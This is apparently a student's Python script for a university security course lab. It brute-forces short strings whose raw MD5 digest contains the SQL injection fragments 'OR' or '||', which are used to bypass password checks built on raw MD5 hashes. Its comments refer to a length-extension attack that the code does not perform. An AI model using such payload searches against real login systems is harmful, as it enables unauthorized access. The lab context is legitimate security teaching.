#!/usr/bin/python3
import sys
import hashlib
import string
import itertools

# Run me like this:
# $ python3 len_ext_attack.py "https://project1.eecs388.org/uniqname/lengthextension/api?token=...."
# or select "Length Extension" from the VS Code debugger
from hashlib import md5

def main():

    everything = string.digits + string.ascii_letters 
    len = 5
    print("Lets crack this hoe")
    for x in itertools.product(everything, repeat = len):
        p = "".join(x)
        hashed = md5(p.encode("latin-1")).digest().decode("latin-1")
        if "'OR'" in hashed.upper():
            print(p)
            print(hashed)
        if "'||'" in hashed:
            print(p)
            print(hashed)





    print("test")

if __name__ == '__main__':
    main()